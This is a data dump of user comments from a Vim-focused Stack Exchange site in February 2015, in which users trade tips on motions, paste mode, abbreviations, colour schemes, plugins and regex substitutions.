  <row Id="1267" PostId="1960" Score="0" Text="@Carpetsmoker You have right, I seriously misunderstood something! I repaired my question, maybe it were enough to a VtC removal?" CreationDate="2015-02-19T14:05:17.663" UserId="28" />
  <row Id="1268" PostId="1916" Score="4" Text="Since I moved from visual selection to marking and relative line numbers about a year ago I found that vi motion commands are much faster and efficient then visual selection. Even though the later is *easier* every time I hit the `v` key I ask myself do I really need it or is there a better motion way?" CreationDate="2015-02-19T14:21:50.657" UserId="544" />
  <row Id="1271" PostId="1960" Score="0" Text="You're still not really describing *what you want to do*. What does Vim do now? What do you *want it to do*?" CreationDate="2015-02-19T14:48:00.833" UserId="51" />
  <row Id="1274" PostId="1960" Score="0" Text="@Carpetsmoker I extended my question with the answer, maybe it is now understandable?" CreationDate="2015-02-19T14:57:04.003" UserId="28" />
  <row Id="1277" PostId="1960" Score="2" Text="I've edited the question to what I *think* you mean... It's still not entirly clear *why* you would want to do this btw (XY-problem?)" CreationDate="2015-02-19T15:06:54.823" UserId="51" />
  <row Id="1281" PostId="1959" Score="0" Text="At first I thought this answer was a bit off topic but then I installed the plugin and I have to say it's a game changer for me. I used to swap manually and the extra mental step meant that I shyed away from using those motions. Thank you!" CreationDate="2015-02-19T15:16:13.860" UserId="544" />
  <row Id="1282" PostId="146" Score="0" Text="@hatter Cool, thanks. I'll add that in." CreationDate="2015-02-19T15:16:36.407" UserId="142" />
  <row Id="1289" PostId="1971" Score="1" Text="No, this is not possible. The output if `:!` is shown in the command line, of which there is only one, and can only be at the bottom of the screen. The best I can think of is creating a new buffer/:split underneath the current one..." CreationDate="2015-02-19T15:43:01.260" UserId="51" />
  <row Id="1290" PostId="1971" Score="0" Text="@Carpetsmoker, For me, the output of `:!` does not go to the command line. Instead the vim session disappears and the entire terminal window shows the terminal output, including what was printed before `vim` was invoked." CreationDate="2015-02-19T15:47:00.627" UserId="69" />
  <row Id="1291" PostId="1971" Score="1" Text="Maybe that's due to the terminal you use and/or the `TERM` setting?" CreationDate="2015-02-19T15:49:05.297" UserId="51" />
  <row Id="1295" PostId="1973" Score="0" Text="possible duplicate of [How to convert all windows into horizontal, vertical or tab splits?](http://vi.stackexchange.com/questions/758/how-to-convert-all-windows-into-horizontal-vertical-or-tab-splits)" CreationDate="2015-02-19T15:59:10.573" UserId="467" />
  <row Id="1299" PostId="1985" Score="0" Text="Confirmed. Also, it's answered here: http://stackoverflow.com/questions/16030639/vim-formatoptions-or" CreationDate="2015-02-19T16:48:18.520" UserId="245" />
  <row Id="1300" PostId="1899" Score="0" Text="@Carpetsmoker I'm running Debian and have through patch 488... I'm not sure why OP has older. Wheezy (current release) has 7.3, so OP isn't using that. Unstable, Jessie, and Wheezy-Backports all have 7.4 patch 488. (Given, 640 is current, so that's still somewhat old.)" CreationDate="2015-02-19T16:50:39.173" UserId="31" />
  <row Id="1301" PostId="1984" Score="0" Text="Does this happen in other text-editors?" CreationDate="2015-02-19T16:51:37.840" UserId="245" />
  <row Id="1302" PostId="1912" Score="0" Text="I was using the html filetype. I just tried that plugin, and now vim highlights in red the outer closing bracket (`&gt;`) instead of the inner one." CreationDate="2015-02-19T16:51:54.117" UserId="178" />
  <row Id="1303" PostId="1914" Score="0" Text="Yeah my main reason for this format was that I'm not very good at SQL, so when I run into issues I copy and paste the SQL into a MySQL client to test things, and then when I've figured it out I put it back in my project. I found this syntax the easiest to convert to a single line of SQL." CreationDate="2015-02-19T16:53:58.863" UserId="178" />
  <row Id="1304" PostId="1981" Score="2" Text="I don't know of anything off the top of my head, but if you do this a lot, why not create a mapping/command?" CreationDate="2015-02-19T16:55:17.240" UserId="680" />
  <row Id="1305" PostId="1984" Score="0" Text="This is pasting into a terminal? `:set paste`. See also http://vi.stackexchange.com/questions/328/set-the-paste-option-but-for-one-insertion-only and http://vi.stackexchange.com/questions/730/how-can-i-copy-paste-new-text-without-auto-indentation-at-every-new-line." CreationDate="2015-02-19T16:57:03.403" UserId="31" />
  <row Id="1306" PostId="1981" Score="0" Text="@MattBoehm yeah, as I said, I just want to make sure there _really_ isn't something I missed out. I don't want to reinvent the wheel." CreationDate="2015-02-19T16:58:57.250" UserId="682" />
  <row Id="1307" PostId="390" Score="0" Text="My personal experience is that `Pathogen` is the worst choice you have among so many good alternatives. If you manage your bundles as git submodules then you often have to deal with lots of updates that are irrelevant to the changes you make, which is quite messy.  The other choices are just as minimal, from the user's perspective, let alone easier to use, as most of them manages bundles for you.  Currently my preferred choice is `vim-plug`." CreationDate="2015-02-19T17:03:09.883" UserId="332" />
  <row Id="1308" PostId="1987" Score="1" Text="I actually changed it permanently with the solution described at http://vi.stackexchange.com/a/1985/178, but this also works and is better suited for this particular problem." CreationDate="2015-02-19T17:06:29.607" UserId="178" />
  <row Id="1309" PostId="1935" Score="0" Text="Seems silly to copy/paste keybinds but there you go; I already described what it does." CreationDate="2015-02-19T17:07:15.070" UserId="609" />
  <row Id="1310" PostId="1912" Score="0" Text="Would you recommend just finding another plugin?" CreationDate="2015-02-19T17:09:02.427" UserId="178" />
  <row Id="1311" PostId="161" Score="0" Text="Why would you use :1&lt;enter&gt; when you can use gg?" CreationDate="2015-02-19T17:12:17.010" UserId="712" />
  <row Id="1313" PostId="1912" Score="1" Text="That would probably be the quickest solution. ;)" CreationDate="2015-02-19T17:17:22.280" UserId="343" />
  <row Id="1314" PostId="1981" Score="4" Text="Hmm, `1,$s/\_./\=@+` is not a solution :P, `:%d|put+` is closer, but not quite there." CreationDate="2015-02-19T17:21:44.627" UserId="220" />
  <row Id="1315" PostId="1981" Score="0" Text="@Sukminder well, I actually like it. :-D Let me try to understand these patterns." CreationDate="2015-02-19T17:26:34.083" UserId="682" />
  <row Id="1316" PostId="1987" Score="1" Text="There's also `:set invpaste` to toggle it" CreationDate="2015-02-19T17:29:35.117" UserId="609" />
  <row Id="1317" PostId="1981" Score="1" Text="I forgot an asterisk after the dot ... `1,$s/\_.*/\=@+`, where `\_.` matches any character *including* newline." CreationDate="2015-02-19T17:32:45.353" UserId="220" />
  <row Id="1318" PostId="770" Score="0" Text="Don't as it to your bashrc, add it to your vimrc." CreationDate="2015-02-19T17:33:26.237" UserId="163" />
  <row Id="1319" PostId="770" Score="0" Text="I meant vimrc.  But I found the problem.  Vim needs to be built with xclipboard support" CreationDate="2015-02-19T17:45:39.777" UserId="496" />
  <row Id="1320" PostId="1940" Score="0" Text="I like this in the sense that `.vimrc_secure` is independent of the `.vimrc`(as doing as you say then allows the user to `:e private file` [thus keeping the file out of the shell history as well]), but using `vim -u ~/.vimrc-incognito` will not source `~/.vimrc` at all, correct? The joys of privacy should not come at the cost of reduced comfort (unless the comfort is fundamentally flawed via malicious plugin or buggy feature). While there should be an emphasis on the risk of unknowns, surely, there must be some way to conditionally wrap your solution..." CreationDate="2015-02-19T17:47:58.597" UserId="44" />
  <row Id="1321" PostId="1980" Score="0" Text="Thank you for the input, will test each solution. I tested the YouCompleteMe and only `GoToDeclaration` works with multiple source files. Here's a quote from the docs about `GoToDefinition`: `For C-family languages this only works ... when the definition of the symbol is in the current translation unit.`. Also, the commands are `:YcmCompleter GoTo*`." CreationDate="2015-02-19T18:03:11.370" UserId="669" />
  <row Id="1322" PostId="1980" Score="0" Text="I missed this line. That means that clang_indexer may still be useful.&#xA;The other solutions may be a bit tricky to install. Don't hesitate to send me an email if need be." CreationDate="2015-02-19T18:16:11.317" UserId="626" />
  <row Id="1323" PostId="1996" Score="0" Text="What's the rationale behind the function name `Qtx`?" CreationDate="2015-02-19T20:47:51.303" UserId="51" />
  <row Id="1324" PostId="1916" Score="1" Text="Yeah, in the same way it's interesting, @Sukima, that I feel more efficient the less I use the mouse, even in a GUI. I find myself being faster if I can stay on the keyboard." CreationDate="2015-02-19T21:14:13.367" UserId="579" />
  <row Id="1325" PostId="730" Score="0" Text="See also [Set the paste option, but for one insertion only](https://vi.stackexchange.com/questions/328/set-the-paste-option-but-for-one-insertion-only)" CreationDate="2015-02-19T21:41:42.337" UserId="8" />
  <row Id="1326" PostId="734" Score="1" Text="I think you're looking for [Set the paste option, but for one insertion only](https://vi.stackexchange.com/questions/328/set-the-paste-option-but-for-one-insertion-only/348#348)" CreationDate="2015-02-19T21:42:16.267" UserId="8" />
  <row Id="1327" PostId="1981" Score="2" Text="Do you _have_ to reuse the buffer, or would it be acceptable to start a new buffer?" CreationDate="2015-02-19T21:54:10.217" UserId="24" />
  <row Id="1328" PostId="2000" Score="0" Text="Thank you. For educational purposes, can you add how to do this without the use of `[^&quot;]`?" CreationDate="2015-02-19T22:01:01.787" UserId="489" />
  <row Id="1329" PostId="2000" Score="0" Text="@merb Sure, edited in an alternative that uses `\_.`." CreationDate="2015-02-19T22:03:38.290" UserId="88" />
  <row Id="1332" PostId="2004" Score="0" Text="Added more details about Windows" CreationDate="2015-02-19T22:25:13.177" UserId="760" />
  <row Id="1333" PostId="2006" Score="3" Text="hah; I have the same problem with the \" CreationDate="2015-02-19T22:28:57.940" UserId="51" />
  <row Id="1334" PostId="2007" Score="0" Text="The `gn` piece is selecting from the line where `V` is triggered to the *next* (not the one on the same line) occurrence of the pattern. Vim's documentation states that if visual mode is active, the selection is extended from the current line through the next pattern. This is causing unwanted behavior." CreationDate="2015-02-19T22:29:36.380" UserId="489" />
  <row Id="1335" PostId="2007" Score="0" Text="@merb Whoops, didn't realize that. Edited." CreationDate="2015-02-19T22:31:58.800" UserId="88" />
  <row Id="1336" PostId="2007" Score="0" Text="The selection is still from the line of the match to the *next* match. Stepping through the normal mode commands manually shows that `//s&lt;cr&gt;` leaves me at the beginning of the match on the current line, but `//e&lt;cr&gt;` leaves me at the end of the next match, not the current match." CreationDate="2015-02-19T22:36:47.837" UserId="489" />
  <row Id="1337" PostId="2008" Score="0" Text="I ran `:cmap w' w`, but there was no change in behavior.  `:w'` still results in writing to a file named `'`. `&quot;'&quot; [New] 0L, 0C written`." CreationDate="2015-02-19T22:39:53.203" UserId="319" />
  <row Id="1338" PostId="2007" Score="0" Text="@merb Huh, that's strange. It works for me (even with `vim -u NONE`). Are you perhaps running this command while already on the first match? You should enter this from the beginning of the file." CreationDate="2015-02-19T22:40:03.140" UserId="88" />
  <row Id="1339" PostId="1981" Score="2" Text="I think Sukminder's `:%d|put+` fits the bill. It's short and memorable. The other command is just too arcane to remember and type correctly." CreationDate="2015-02-19T22:43:46.663" UserId="632" />
  <row Id="1340" PostId="2007" Score="0" Text="Yes, I am running it from the top of the file. I tested it with `vim -u NONE` and it doesnt work there either.. my Vim version is `7.4` if that makes any difference." CreationDate="2015-02-19T22:44:41.533" UserId="489" />
  <row Id="1341" PostId="2008" Score="0" Text="@mwcz Does the `'` actually show up when you press it after `w`? It shouldn't if the `cmap` was successfully created - a cmap LHS is automatically filled in with the RHS, so if you press a `'`, it should still only show `w`." CreationDate="2015-02-19T22:48:03.640" UserId="205" />
  <row Id="1342" PostId="161" Score="0" Text="@Tanath Commenting from the first line was specific to this example.  If the author wanted to comment from lines 9 to 22 they would not be able to use gg." CreationDate="2015-02-19T22:53:55.503" UserId="141" />
  <row Id="1343" PostId="161" Score="0" Text="@Ben I did not know anything about the `normal` command before writing this answer.  You're right; `:9,22 normal I#` will work as well." CreationDate="2015-02-19T22:57:04.330" UserId="141" />
  <row Id="1344" PostId="2007" Score="1" Text="The problem appears to be with `//s&lt;cr&gt;V`. When I run `:normal V` I go into visual line mode, as expected. When I run `:normal //s&lt;cr&gt;` my cursor lands on the first `&quot;` of the match, as expected. When I run `:normal //s&lt;cr&gt;V` I do not get a visual selection." CreationDate="2015-02-19T23:04:31.290" UserId="489" />
  <row Id="1345" PostId="2008" Score="1" Text="Be careful with bare `cmap`'s and `cabbrev`'s. They will execute/expand in other modes and other places. e.g. `:s/'follow'/foo` and `/'follow'`. Please see the following [vim change :x function to delete buffer instead of save &amp; quit](http://stackoverflow.com/q/7513380/438329) or use [cmdalias.vim](http://www.vim.org/scripts/script.php?script_id=746)" CreationDate="2015-02-19T23:20:29.763" UserId="778" />
  <row Id="1346" PostId="2002" Score="3" Text="You can also use `g;` and `g,` to move between position in the change list. See `:h g;` and `:h g,`" CreationDate="2015-02-19T23:21:36.553" UserId="778" />
  <row Id="1348" PostId="2008" Score="1" Text="Better safe than sorry: `cnoreabbrev &lt;expr&gt; w' getcmdtype() == &quot;:&quot; &amp;&amp; getcmdline() == &quot;w'&quot; ? &quot;w&quot; : &quot;w'&quot;`" CreationDate="2015-02-19T23:27:04.673" UserId="778" />
  <row Id="1351" PostId="2004" Score="0" Text="Thanks :-) Someone should maybe also add some info about OSX/MacVim? I have never really used OSX..." CreationDate="2015-02-19T23:35:09.013" UserId="51" />
  <row Id="1352" PostId="2008" Score="0" Text="Yes, the `'` still shows up, but I just figured out it's because I'm using cmdwin to enter commands, and cmdwin is just a regular buffer, so `cmap/cnoreabbrev` don't work there.  Updating the answer with `noreabbrev` option for cmdwin users. :)  Thanks!!!" CreationDate="2015-02-19T23:42:28.010" UserId="319" />
  <row Id="1353" PostId="731" Score="0" Text="Another plugin option: [Vim-unimapired](https://github.com/tpope/vim-unimpaired) provides `yo` / `yO` operators that mimic `o` and `O` operators but only `set paste` until insert mode is exited." CreationDate="2015-02-19T23:43:51.037" UserId="778" />
  <row Id="1355" PostId="2008" Score="0" Text="@muru no problem.  It's not a plugin. `:help cmdwin`.  It lets you edit `:` commands in a regular buffer, so you can use vim to edit commands.  I jumped the gun though, `noreabbrev` doesn't actually work in cmdwin." CreationDate="2015-02-19T23:51:27.343" UserId="319" />
  <row Id="1356" PostId="2004" Score="0" Text="This technique is called [Binary Search Fault Localization](http://of-vim-and-vigor.blogspot.ca/2013/04/bisectly.html)." CreationDate="2015-02-19T23:53:12.417" UserId="64" />
  <row Id="1358" PostId="2007" Score="1" Text="Solved it. The command needs to be `normal gngq`. Suggesting an edit." CreationDate="2015-02-19T23:57:03.390" UserId="489" />
  <row Id="1359" PostId="2004" Score="0" Text="@tommcdo Yeah, I had it in math classes at high school, I even looked up the name of it when I wrote this, [but then I remembered Feynman](https://www.youtube.com/watch?v=05WS0WN7zMQ) :-)" CreationDate="2015-02-19T23:59:33.073" UserId="51" />
  <row Id="1361" PostId="2008" Score="0" Text="@mwcz Try an `inorebbrev` or `inoremap`. I updated with a couple of `autocmd`s that seem to work for me." CreationDate="2015-02-20T00:06:48.020" UserId="205" />
  <row Id="1362" PostId="2016" Score="0" Text="Notice the quotation mark in the question.  `:w'`, not `:w`.  I want to use `:w` without accidentally hitting `'`, which writes a file I must then `rm \'`.  Good tips, though." CreationDate="2015-02-20T00:09:40.467" UserId="319" />
  <row Id="1363" PostId="2008" Score="0" Text="Perfect!  Thanks @muru !" CreationDate="2015-02-20T00:12:56.330" UserId="319" />
  <row Id="1365" PostId="2016" Score="1" Text="Ctrl-S doesn't send a sigstop - if the program stops, it's probably because a buffer was full. See http://unix.stackexchange.com/questions/13629/whats-the-difference-between-the-s-and-z-control-characters-inside-a-terminal'" CreationDate="2015-02-20T00:19:04.353" UserId="205" />
  <row Id="1366" PostId="2018" Score="0" Text="@A B I am on Linux, I don't want to use gnu screen buffer or tmp file. How do I use system clipboard from vim?" CreationDate="2015-02-20T00:21:07.123" UserId="784" />
  <row Id="1367" PostId="2018" Score="5" Text="@name http://vi.stackexchange.com/questions/84/how-can-i-copy-text-to-the-system-clipboard-from-vim/96#96 - though I think that requires X-forwarding if you're on SSH." CreationDate="2015-02-20T00:22:09.140" UserId="205" />
  <row Id="1369" PostId="2007" Score="0" Text="@merb Ah, thanks. (Sorry for not responding to your comments earlier; I had to leave.)" CreationDate="2015-02-20T00:31:18.410" UserId="88" />
  <row Id="1371" PostId="2021" Score="1" Text="For a quicker and dirtier regex use: `http.\?:\/\/\S\+'`. Works with `grep` as well." CreationDate="2015-02-20T00:48:10.043" UserId="778" />
  <row Id="1373" PostId="1925" Score="0" Text="What's the problem with *line numbers* going from -1 to +1? I can see how it could cause you trouble in mathematics, but in line numbers?" CreationDate="2015-02-20T01:13:29.873" UserId="801" />
  <row Id="1374" PostId="1925" Score="0" Text="@Jerry The asymmetry between the upward and downward numbering schemes would be harmful, for example. It would make my suggested `d2j` vs. `d2k` confusing." CreationDate="2015-02-20T01:17:56.597" UserId="24" />
  <row Id="1375" PostId="1882" Score="1" Text="Indeed it does. When I tried it last time, Vim kept telling me it was a syntax error. It must have been somewhere else. Updating my answer." CreationDate="2015-02-20T01:24:07.347" UserId="227" />
  <row Id="1377" PostId="1981" Score="0" Text="@200_success both are fine to me. I'd like to know alternatives." CreationDate="2015-02-20T01:50:48.467" UserId="682" />
  <row Id="1380" PostId="2010" Score="1" Text="By &quot;[m]y terminal has the correct colors and background,&quot; do you mean to say that you followed the [specific advice](http://ethanschoonover.com/solarized/vim-colors-solarized#important-note-for-terminal-users) regarding Vim in the terminal?" CreationDate="2015-02-20T02:35:02.157" UserId="811" />
  <row Id="1382" PostId="2025" Score="0" Text="I'm unfamiliar with viemu. Does it let you yank to an arbitrary register? If so, you could have a file of your macros and do something like `&quot;sy$` to grab one and `@s` to play it" CreationDate="2015-02-20T03:13:03.293" UserId="227" />
  <row Id="1384" PostId="2025" Score="0" Text="It does, and that basically works.  I was considering that solution as somewhat of a last resort; better still would be to have this done automatically on starting the app (and saving macros somewhere automatically as well).  That might be asking a bit much for a &quot;workaround,&quot; but one can hope." CreationDate="2015-02-20T03:25:38.617" UserId="811" />
  <row Id="1385" PostId="161" Score="0" Text="@bsmith89 Then you'd use 9gg. Still one less character and easier to type." CreationDate="2015-02-20T03:27:48.647" UserId="712" />
  <row Id="1387" PostId="2010" Score="2" Text="I did follow the advice, @Andrew. Thank you though." CreationDate="2015-02-20T03:43:23.733" UserId="779" />
  <row Id="1388" PostId="2019" Score="0" Text="The desert256 works fine, but I am not a huge fan. I do believe the `TERM` variable is incorrect, but I have no idea how to change it." CreationDate="2015-02-20T03:54:29.770" UserId="779" />
  <row Id="1390" PostId="1871" Score="0" Text="You may be better off using [`:abbreviate`](https://vimhelp.appspot.com/map.txt.html#%3Aabbreviate) instead. For example, issue the `:ab 01n {0,1}^n` command. Then, every time you type `01n` as an independent word in Insert mode, it will expand to `{0,1}^n`." CreationDate="2015-02-20T04:58:12.430" UserId="24" />
  <row Id="1392" PostId="2019" Score="0" Text="I installed ncurses-term. I then ran the command. After I run it, all text becomes grey and the background is black." CreationDate="2015-02-20T05:01:27.467" UserId="779" />
  <row Id="1393" PostId="2029" Score="0" Text="set t_Co=16 causes the colors to be radically different from what is expected.&#xA;I am also using the default Xubuntu terminal is Xfce-Terminal." CreationDate="2015-02-20T05:57:57.167" UserId="779" />
  <row Id="1394" PostId="1982" Score="0" Text="Please add a summary of the linked post. Link-only answers become useless when the link goes dead." CreationDate="2015-02-20T06:32:46.953" UserId="205" />
  <row Id="1395" PostId="1941" Score="0" Text="First do `:set ruler`, then go to the top &amp; bottom of the text to find `start` and `end` line numbers, then do `:&lt;start&gt;,&lt;end&gt;d`" CreationDate="2015-02-20T06:46:49.963" UserId="398" />
  <row Id="1396" PostId="2034" Score="0" Text="Okay, that's better than my two-pass self-answer, you get the gong :-)" CreationDate="2015-02-20T06:58:00.450" UserId="579" />
  <row Id="1397" PostId="1961" Score="0" Text="That's not too bad, though it gives a `234x56` window on my system whereas maximising gives `236x57`. Still, being short two columns and one row at that size is not _too_ much of an issue, especially for something that may work in non-Windows platforms as well, though I haven't actually tested it. I'll have a look tonight when I get home to my beloved Debian box :-)" CreationDate="2015-02-20T07:10:15.810" UserId="579" />
  <row Id="1398" PostId="1996" Score="0" Text="@Carpetsmoker: Quouotix Terminates eXitus." CreationDate="2015-02-20T07:27:24.617" UserId="220" />
  <row Id="1399" PostId="1941" Score="0" Text="or `:set number` so that you can see all the line numbers.  `:set ruler` is superior because you can just leave that on (even set in your vimrc) with minimal visual intrusion, though.  I just thought it would be good to mention `:set number` in case anyone was unaware.  Very useful in screen sharing, presentations, etc to make it easy for people to refer to specific lines." CreationDate="2015-02-20T07:28:11.187" UserId="829" />
  <row Id="1400" PostId="1916" Score="3" Text="If you're ever editing something with really long lines, the backtick version of this might come in very handy as well (which refers to the place withinin the line, rather than the whole line)." CreationDate="2015-02-20T07:31:12.520" UserId="829" />
  <row Id="1401" PostId="2000" Score="0" Text="Nice! Although perhaps one should improve slightly so as not to match escaped quotes?" CreationDate="2015-02-20T08:00:49.433" UserId="21" />
  <row Id="1402" PostId="2036" Score="1" Text="Like `.,.+2s/^../*/` (or equivalently in a visual selection)? Why two replace commands? `2c` would replace two characters." CreationDate="2015-02-20T08:40:33.937" UserId="205" />
  <row Id="1403" PostId="2010" Score="0" Text="@Oberdiear The advice Andrew links to explains that you should set up your terminal to use solarized colours, and *not* use  the `g:solarized_termcolors=256` option. If you're happy to use solarized colours in your terminal, this method works much better. The text of your question implies you *have* set up your terminal to use solarized colours (although the screenshot you display doesn't look to me like it does), so in that case, why are you using the `g:solarized_termcolors=256` setting?" CreationDate="2015-02-20T09:01:10.713" UserId="343" />
  <row Id="1404" PostId="2021" Score="1" Text="so the shortest way would be&#xA;  `%s/.\{-}\(http[s]\?:\/\/[[:alnum:]%\/_#.-]*\)/\1\r/g|g!//d`" CreationDate="2015-02-20T09:05:39.487" UserId="179" />
  <row Id="1406" PostId="2036" Score="0" Text="sometimes only the first line in the visual selection is changed, repeating then with . for the other lines messes things up." CreationDate="2015-02-20T09:10:17.257" UserId="833" />
  <row Id="1407" PostId="1871" Score="0" Text="@200_success, thank you. I had thought about abbreviations but still I wanted to know if it was possible with `ins-completion`." CreationDate="2015-02-20T09:37:43.507" UserId="356" />
  <row Id="1408" PostId="2042" Score="0" Text="It will if `:set nocompatible` is not used." CreationDate="2015-02-20T09:47:59.813" UserId="205" />
  <row Id="1409" PostId="2021" Score="2" Text="The problem with parsing URL's is that it's very very tricky to get all URL's; this will for example fail on `http://en.wikipedia.org/wiki/Vi_(Buffy_the_Vampire_Slayer)`, since it doesn't recognize the `(` ... There is also a disparity between what the standard says, and what browser accept... Not saying this a bad answer (+1 from me), just saying it's very difficult (maybe even impossible?) to get this 100% correct (and most, if not all, sites don't get it 100% correct)." CreationDate="2015-02-20T10:31:59.270" UserId="51" />
  <row Id="1410" PostId="2021" Score="2" Text="@Carpetsmoker I expected someone to point that out, hence the link to that classic SO post. :D" CreationDate="2015-02-20T10:36:37.797" UserId="205" />
  <row Id="1411" PostId="2036" Score="1" Text="@poseid are you in the habit of pressing `Ctrl-C` instead of `Esc`? This prevents, among other things, changes being applied to each line of a Visual-block selection." CreationDate="2015-02-20T10:48:20.257" UserId="64" />
  <row Id="1412" PostId="2048" Score="4" Text="Good - can you give a short overview of each of these plugins?" CreationDate="2015-02-20T10:49:51.497" UserId="205" />
  <row Id="1413" PostId="2048" Score="0" Text="Unfortunately not. I have used pyclewn a few years ago (it has been around for some time now -- it's has evolved from the previous _*clewn_ plugins), and indeed I haven't found it very ergonomic at the time (before v2.0).  Since then, I haven't spend much time exploring the other solutions." CreationDate="2015-02-20T10:54:33.407" UserId="626" />
  <row Id="1415" PostId="2048" Score="0" Text="Few months ago I gave a try for pyclewn and I couldn't really set it up correctly." CreationDate="2015-02-20T10:57:50.563" UserId="784" />
  <row Id="1417" PostId="2004" Score="3" Text="It's not usually required, but I feel like at least mentioning `vim -D` debugging might be worthwhile. I've have used it in the past to track down *exactly* what was going wrong with a start-up issue." CreationDate="2015-02-20T11:00:49.907" UserId="343" />
  <row Id="1418" PostId="2042" Score="2" Text="My `vim` (with `nocompatible`) does two undos with `uu`, but I use `u` and `CTRL+r` for the same effect." CreationDate="2015-02-20T11:04:18.900" UserId="850" />
  <row Id="1419" PostId="2004" Score="1" Text="@Rich This is a community wiki post, so feel free to edit :-)" CreationDate="2015-02-20T11:12:24.223" UserId="51" />
  <row Id="1422" PostId="2049" Score="0" Text="Are there effective differences between using this or `:qa`?" CreationDate="2015-02-20T11:51:40.633" UserId="51" />
  <row Id="1423" PostId="2051" Score="0" Text="possible duplicate of [Make :edit {file} use current directory during :Explore](http://vi.stackexchange.com/questions/631/make-edit-file-use-current-directory-during-explore)" CreationDate="2015-02-20T11:54:10.730" UserId="205" />
  <row Id="1424" PostId="2051" Score="0" Text="@muru I'm not sure this is a duplicate ... The problem (having a strange cwd) should not occur at all in the first place, and netrw isn't involved here..." CreationDate="2015-02-20T11:57:04.840" UserId="51" />
  <row Id="1425" PostId="2051" Score="0" Text="@Carpetsmoker alright.. So should I post `autochdir` as an answer?" CreationDate="2015-02-20T11:58:28.310" UserId="205" />
  <row Id="1426" PostId="2029" Score="0" Text="@Oberdiear If setting t_Co=16 affects the colours in that way (with the g:solarized_termcolors variable unset) then that means that your terminal colours are not set up correctly to use solarized. How are you setting your terminal colours?" CreationDate="2015-02-20T11:58:30.043" UserId="343" />
  <row Id="1427" PostId="2047" Score="0" Text="See http://meta.vi.stackexchange.com/questions/118/what-do-we-do-about-software-recommendation-questions" CreationDate="2015-02-20T11:59:29.823" UserId="205" />
  <row Id="1428" PostId="2051" Score="0" Text="@muru yes (good spotting!) , because I just tested it and it works. Although it would be nice to know why the `autocmd` did not work; what if I'd like to have it enabled only for `*.tex` files for example?" CreationDate="2015-02-20T11:59:57.470" UserId="854" />
  <row Id="1429" PostId="2049" Score="0" Text="@Carpetsmoker No difference other that someone can learn something new. One of advantages is that it allows to execute additional custom commands for each window before closing them, but I can't think of practical example yet." CreationDate="2015-02-20T12:00:45.840" UserId="467" />
  <row Id="1430" PostId="734" Score="0" Text="I chose this answer because of your extensive explanation. It works, thank you" CreationDate="2015-02-20T12:06:41.730" UserId="486" />
  <row Id="1431" PostId="2047" Score="0" Text="@muru I changed the wording. Is this more acceptable?" CreationDate="2015-02-20T12:10:57.837" UserId="602" />
  <row Id="1434" PostId="2049" Score="0" Text="Okay :-) Just curious if this would somehow behave subtly different or something..." CreationDate="2015-02-20T12:18:53.060" UserId="51" />
  <row Id="1438" PostId="2015" Score="0" Text="Do you consider to open `file1.txt` and `file2.txt` using one instance? E.g. `vim file1.txt file2.txt`?" CreationDate="2015-02-20T12:30:34.977" UserId="467" />
  <row Id="1439" PostId="282" Score="0" Text="Just a note: e.g. `let mapleader = ' '` also works for setting `&lt;Leader&gt;` to space. If there are any possible side-effects by using this syntax, feel free to mention them." CreationDate="2015-02-20T12:32:12.943" UserId="858" />
  <row Id="1440" PostId="51" Score="0" Text="@Caleb As a user you are currently a non-user of asynchronous plugins.  This won't apply to users of Neovim." CreationDate="2015-02-20T12:40:11.570" UserId="859" />
  <row Id="1441" PostId="2015" Score="0" Text="@kenorb no. It's written in the question." CreationDate="2015-02-20T12:44:45.000" UserId="784" />
  <row Id="1443" PostId="2015" Score="0" Text="In `tmux`, you can start &quot;copy mode&quot; with `prefix+[`, then `space` to select stuff`, `Enter` to copy, then go to the other pane, and use `prefix+]` to paste ... It's very similar to Vim's visual mode. IIRC `screen` can do this as well (but I don't remember how, as I haven't used it in years and years)." CreationDate="2015-02-20T13:21:39.837" UserId="51" />
  <row Id="1446" PostId="1934" Score="2" Text="There is also `d/search-string/e` to delete from current cursor to the end of the search string including the search string itself and `c/search-query` to get into insert mode after deletion. Using `d/` with `set incsearch` is a neat combination as it allows you to interactively figure out whether you are operating on the right text range, and help you know when to stop typing the search query to avoid typing more than is necessary." CreationDate="2015-02-20T15:17:25.553" UserId="632" />
  <row Id="1447" PostId="2047" Score="0" Text="@glance Yeah, I think this wording is a lot better :-) I don't have any TeX expertise so I can't answer it..." CreationDate="2015-02-20T15:40:22.667" UserId="51" />
  <row Id="1448" PostId="740" Score="1" Text="This is nice because it generalizes well to `vimdiff &lt;(echo foo) &lt;(echo bar)`." CreationDate="2015-02-20T15:42:44.143" UserId="142" />
  <row Id="1451" PostId="2015" Score="0" Text="On which operating system?" CreationDate="2015-02-20T15:53:49.500" UserId="878" />
  <row Id="1452" PostId="2047" Score="0" Text="Can't you just read their README/`:help` and make your mind?" CreationDate="2015-02-20T15:54:06.393" UserId="54" />
  <row Id="1456" PostId="2047" Score="4" Text="@romainl That's something that can be said about almost *any* question here &quot;just RTFM&quot;. I haven't looked at the various README's, but it's often very hard (as in: impossible) to compare software in this way. It may not work as advertised. Or there may be differences that are undocumented, it may differ in important details, and so forth ... I think this is a useful question just as [What is the difference between the vim package managers?](http://vi.stackexchange.com/q/388/51) is a useful question." CreationDate="2015-02-20T16:14:03.233" UserId="51" />
  <row Id="1457" PostId="397" Score="0" Text="@JustinM.Keyes Thanks; updated answer. All the docs are about using it in UNIX-y systems, I searched for Windows support; and nothing was mentioned as far as I could see. I also saw some UNIX-isms in the code, so I assumed it wouldn't work on Windows." CreationDate="2015-02-20T16:16:55.437" UserId="51" />
  <row Id="1458" PostId="2047" Score="0" Text="@Carpetsmoker, yes, &quot;That's something that can be said about almost any question here &quot;just RTFM&quot;&quot; is exactly my opinion. Trying and evaluating software before commiting is unfortunately something nobody wants to do anymore. Same for reading documentation. It's sad, really." CreationDate="2015-02-20T16:20:47.287" UserId="54" />
  <row Id="1459" PostId="1919" Score="3" Text="Or `:set number`, and then use d35G to delete until line 35." CreationDate="2015-02-20T16:22:03.960" UserId="880" />
  <row Id="1461" PostId="2057" Score="1" Text="I'd suggest using `G` instead of gg as it also works in vi, and of course `:set number` is always useful for finding what line number the line you want to go to is." CreationDate="2015-02-20T16:24:12.393" UserId="880" />
  <row Id="1463" PostId="2053" Score="0" Text="Neither `BufReadPost` nor `BufWinEnter` (as suggested by  @muru) work.  `set autochdir` do work, but only globally. (BTW, I too think it's a bug/misfeature of Nautilus. Just searching a workaround)" CreationDate="2015-02-20T16:31:02.263" UserId="854" />
